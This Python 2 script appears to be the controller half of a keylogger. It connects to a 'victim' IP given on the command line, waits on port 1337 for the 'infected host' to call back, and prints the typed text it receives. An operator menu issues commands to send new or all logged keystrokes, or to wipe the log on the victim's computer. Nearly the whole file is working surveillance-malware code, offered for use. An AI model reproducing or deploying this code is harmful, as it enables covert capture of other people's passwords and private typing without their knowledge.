#!/usr/bin/python           # This is server.py file

'''my machine ip = 10.194.100.23 '''

from socket import *               # Import socket module
from thread import *
import threading
import sys
import msvcrt
import pdb


if(len(sys.argv) != 2):
	raise RuntimeError("Invalid Argument! Expected a passed in IP address (of the victim). \nExiting...")


#some defines
doneFlag = False
BUFFER_SIZE = 1024
serverPort = 1337
commandPort = 1347
pingPort = 1357

#victimIP = ''
victimIP = sys.argv[1]


def waitForEscape(x=None):
	global doneFlag
	while(1):
		if msvcrt.kbhit():
			if ord(msvcrt.getch()) == 27:
				doneFlag = True
				print "ESCAPE DETECTED"
				break	


def listenfordata(ip_val):
	global doneFlag
	global BUFFER_SIZE
	global serverPort
	global pingPort
	global victimIP
	#ip = '127.0.0.1'
	#ip = ip_val
	ping = socket(AF_INET, SOCK_STREAM)

	#pdb.set_trace()
	ping.connect((victimIP, pingPort))
	print 'Pinged!'

	server = socket(AF_INET, SOCK_STREAM)		#create TCP socket for server, remote port 1337
	server.bind(('', serverPort))
	server.listen(1)
	print "Waiting for connection from infected host..."
	conn, addr = server.accept()
	print "Received connection from ", addr 
	victimIP = addr[0]
	conn.settimeout(15)			#may remove later

	start_new_thread(sendCommands, ()) #SPAWN NEW THREAD; creating new port for sending commands to victim

	while(not doneFlag):

		try:
			data = conn.recv(BUFFER_SIZE)
			if(len(data) != 0):
				print data
		except timeout: 
			print "Waiting..."
		except error:
			doneFlag = True
			break
	
	try:
		server.close()
		conn.close()
	except Exception:
		print "Error closing sockets..."
		pass

def sendCommands(z=None):
	global commandPort
	global victimIP
	global doneFlag
	port = commandPort
	ip = victimIP 		
	commSock = socket(AF_INET, SOCK_STREAM)
	print victimIP
	commSock.connect((victimIP, commandPort))
	commSock.send("Listening...")
	while(not doneFlag):
		print "What do you want to do? (HELP, SEND, SENDALL, CLEAR, EXIT)"
		command = raw_input()
		if((command != 'HELP') and (command != 'help')):
			commSock.send(command)
		else:
			print 'SEND: send updated client typed info'
			print 'SENDALL: send entire typed history from client'
			print 'CLEAR: clear the typed logged info on client computer'
			print 'EXIT: stop this program from running \n'

		if((command == 'STOP') or (command == 'EXIT') or (command == 'stop') or (command == 'exit')):
			doneFlag = True;
		pass
	
	try:
		commSock.close()
	except Exception:
		pass

	pass


'''MAIN'''

#start_new_thread(waitForEscape, ())
listenfordata(sys.argv[1])


print "Server script terminated..."
sys.exit()

